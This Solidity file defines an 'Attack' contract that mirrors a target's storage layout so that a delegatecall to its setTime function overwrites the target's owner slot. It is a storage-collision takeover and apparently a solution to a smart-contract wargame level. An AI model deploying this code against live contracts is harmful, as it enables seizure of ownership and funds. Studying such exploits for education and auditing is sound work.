// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./library.sol";

contract Attack {

    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    uint public owner; 
    uint storedTime;

    // adjust the estimate gas in metamask to a huge amount
    // otherwise this may not be executed because of running out of gas
    function setTime(uint myaddress) public {
        owner = myaddress;
    }

}